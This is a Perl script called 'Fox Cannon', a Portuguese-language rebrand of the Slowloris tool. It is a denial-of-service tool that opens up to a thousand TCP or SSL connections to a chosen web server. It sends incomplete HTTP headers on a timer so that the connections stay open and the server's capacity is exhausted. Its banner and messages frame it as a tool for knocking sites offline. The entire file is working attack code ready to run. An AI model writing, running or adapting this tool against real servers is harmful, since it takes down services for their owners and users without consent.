#!/usr/bin/perl -w
use strict;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;

$SIG{'PIPE'} = 'IGNORE';    

 print <<EOTEXT;
	        
                         ,ifCCCCCCCCCCCCCf1:.                         
                    :fCCCCCCCCCCCCCCCCCCCCCCCCCL;.                    
                .tCCCCCCCCCCCCCLfftffLCCCCCCCCCCCCCL:                 
              1CCCCCCCCC1:  iCCCCi         ,fCCCCCCCCCf,              
           .LCCCCCCC1.        fCCCCf.     .fCCCCCCCCCCCCC:            
         .LCCCCCC1.            fCCCCCCCCCCCCCCCCCCt;CCCCCCC:          
        1CCCCCC;               LCCCCCCCCCCCCCCCCCC:  ,LCCCCCL         
      .CCCCCCi                tC..CCCt  1CCCCCCCCCf    ,CCCCCC:       
     ,CCCCCL.               ;CCCCCCCCCCCCCCCCCCCCCCL     1CCCCCi      
    ,CCCCC1                ,CCCCCCCCCCCCCCCCCCCCCCCL      :CCCCCi     
   .CCCCC1                  ,CCCCCCCCC1CCCCCCCCCCCC:       :CCCCC;    
   LCCCCt                     L1  .     iCCCCCCCCCi         ;CCCCC,   
  ;CCCCC                      fC;            ,tCCC.          tCCCCf   
  LCCCCi                    .LCCC1              LC1          ,CCCCC.  
 .CCCCC.                   fCCCCCCC.            iCC.          fCCCCi  
 ;CCCCL                ,1LCCCCCCCCCC.           .CC.          1CCCCt  
 ;CCCCf             ,LCCCCCCCCCCCCCCt            C1           iCCCCf  
 ;CCCCL            fCCCCCCCCCCCCCCCCCCL:                      1CCCCt  
 .CCCCC           LCCCCCCCCCCCCCCCCCCCCCC1                    fCCCCi  
  LCCCCi         fCCCCCCCCCCCCCCCCCCCCCCCC,                  .CCCCC,  
  iCCCCL        ;CCCCCCCCCCCCCCCCCCCCCCCCC1                  1CCCCf   
   LCCCC1        CCCCCCCCCCCCCCCCCCCCCCCCC1                 ;CCCCC,   
   ,CCCCCi        LCCCCCCCCCCCCCCCCCCCCCCC, :              ,CCCCCi    
    :CCCCCi.1CCCCCCCCCCCCCCCCCCCCCCCCCCCCi ;C:            ,CCCCCt     
     :CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  iCC,          iCCCCCt      
      ,CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC   1CCCt.     .LCCCCCi       
        tCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCf, .CCCt   .fCCCCCC.        
         ,CCCCCCCCCCCCCCCCCCCCCCCi.CCCCCCCCL  ..   ,LCCCCCC;          
           :CCCCCCCCCCCCCCCCCCL,    ,1fft;      ,fCCCCCCCi            
             .fCCCCCCCCCCCLt.               ;tCCCCCCCCL:              
                :LCCCCCCCCCCCCLt11ii11fCCCCCCCCCCCCCi                 
                   .iLCCCCCCCCCCCCCCCCCCCCCCCCCC1,                    
                        .;tCCCCCCCCCCCCCCCfi,                                                                                                                                                            
                                                                                                                                                               
       Bem vindo ao Fox Cannon, Atiramos Balas de Canhão em Formigas 
                 Baseado em Slowloris Flood Stress
                  Tecnologia Fox - Matheus Fidelis



EOTEXT

my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
my $result = GetOptions(
    'shost=s'   => \$shost,
    'dns=s'     => \$host,
    'httpready' => \$httpready,
    'num=i'     => \$connections,
    'cache'     => \$cache,
    'port=i'    => \$port,
    'https'     => \$ssl,
    'tcpto=i'   => \$tcpto,
    'test'      => \$test,
    'timeout=i' => \$timeout,
    'version'   => \$version,
);

if ($version) {
    print "Version 0.7\n";
    exit;
}

unless ($host) {
    print "Usage:\n\n\tperl $0 -dns [localhost] -options\n";
    print "\n\tType 'perldoc $0' for help with options.\n\n";
    exit;
}

unless ($port) {
    $port = 80;
    print "Setando a porta 80 como Default.\n";
}

unless ($tcpto) {
    $tcpto = 5;
    print "Setando o timeout das conexões TCP para 5 segundos.\n";
}

unless ($test) {
    unless ($timeout) {
        $timeout = 100;
        print "Defaul padrão de tentativas setado para 100 segundos.\n";
    }
    unless ($connections) {
        $connections = 1000;
        print "Setando a quantidade de conexões para 1000.\n";
    }
}

my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    print "Hoje acordamos para botar isso pra baixo...\n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
    print "O sistema de multithreading parece não estar funcionando\n";
    print "O Cannon está mais lento do que deveria, algo está errado...\n";
}

my $packetcount : shared     = 0;
my $failed : shared          = 0;
my $connectioncount : shared = 0;

srand() if ($cache);

if ($shost) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if ($httpready) {
    $method = "POST";
}
else {
    $method = "GET";
}

if ($test) {
    my @times = ( "2", "30", "90", "240", "500" );
    my $totaltime = 0;
    foreach (@times) {
        $totaltime = $totaltime + $_;
    }
    $totaltime = $totaltime / 60;
    print "O teste ainda vai demorar em média $totaltime minutos\n";

    my $delay   = 0;
    my $working = 0;
    my $sock;

    if ($ssl) {
        if (
            $sock = new IO::Socket::SSL(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    else {
        if (
            $sock = new IO::Socket::INET(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    if ($working) {
        if ($cache) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        my $primarypayload =
            "GET /$rand HTTP/1.1\r\n"
          . "Host: $sendhost\r\n"
          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
          . "Content-Length: 42\r\n";
        if ( print $sock $primarypayload ) {
            print "Conectado, aguardando o status da paradinha louca.\n";
        }
        else {
            print
"Estamos conectados, mas não conseguimos mandar informações para $host:$port.\n";
            print "Você fez algo errado??\nDying.\n";
            exit;
        }
    }
    else {
        print "Não consegui conectara $host:$port.\n";
        print "O que você fez de errado?\nDying.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Trying a $times[$i] second delay: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\tWorked.\n";
            $delay = $times[$i];
        }
        else {
            if ( $SIG{__WARN__} ) {
                $delay = $times[ $i - 1 ];
                last;
            }
            print "\tA operação falhou após $times[$i] segundos.\n";
        }
    }

    if ( print $sock "Conexão: Close\r\n\r\n" ) {
        print "Estamos fechando os sockets.\n";
        print "Use $delay segundos de -timeout na próxima vez.\n";
        exit;
    }
    else {
        print "Remote server closed socket.\n";
        print "Use $delay seconds for -timeout.\n";
        exit;
    }
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
Since the timeout ended up being so small ($delay seconds) and it generally 
takes between 200-500 threads for most servers and assuming any latency at 
all...  you might have trouble using Slowloris against this target.  You can 
tweak the -timeout flag down to less than 10 seconds but it still may not 
build the sockets in time.
EOSUCKS2BU
    }
}
else {
    print
"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";

    if ($usemultithreading) {
        domultithreading($connections);
    }
    else {
        doconnections( $connections, $usemultithreading );
    }
}

sub doconnections {
    my ( $num, $usemultithreading ) = @_;
    my ( @first, @sock, @working );
    my $failedconnections = 0;
    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
    while (1) {
        $failedconnections = 0;
        print "\t\tAtirando Bolas de Canhão em Formigas.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
                        $sock[$z] = new IO::Socket::SSL(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                else {
                    if (
                        $sock[$z] = new IO::Socket::INET(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                if ( $working[$z] == 1 ) {
                    if ($cache) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    my $primarypayload =
                        "$method /$rand HTTP/1.1\r\n"
                      . "Host: $sendhost\r\n"
                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                      . "Content-Length: 42\r\n";
                    my $handle = $sock[$z];
                    if ($handle) {
                        print $handle "$primarypayload";
                        if ( $SIG{__WARN__} ) {
                            $working[$z] = 0;
                            close $handle;
                            $failed++;
                            $failedconnections++;
                        }
                        else {
                            $packetcount++;
                            $working[$z] = 1;
                        }
                    }
                    else {
                        $working[$z] = 0;
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print "\t\tEnviando Requisições.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 1 ) {
                if ( $sock[$z] ) {
                    my $handle = $sock[$z];
                    if ( print $handle "X-a: b\r\n" ) {
                        $working[$z] = 1;
                        $packetcount++;
                    }
                    else {
                        $working[$z] = 0;
                        #debugging info
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    #debugging info
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print
"Status Atual:\tFoxCannon enviou $packetcount pacotes no alvo.\nExecutando o Sleeping por $timeout segundos...\n\n";
        sleep($timeout);
    }
}

sub domultithreading {
    my ($num) = @_;
    my @thrs;
    my $i                    = 0;
    my $connectionsperthread = 50;
    while ( $i < $num ) {
        $thrs[$i] =
          threads->create( \&doconnections, $connectionsperthread, 1 );
        $i += $connectionsperthread;
    }
    my @threadslist = threads->list();
    while ( $#threadslist > 0 ) {
        $failed = 0;
    }
}

__END__
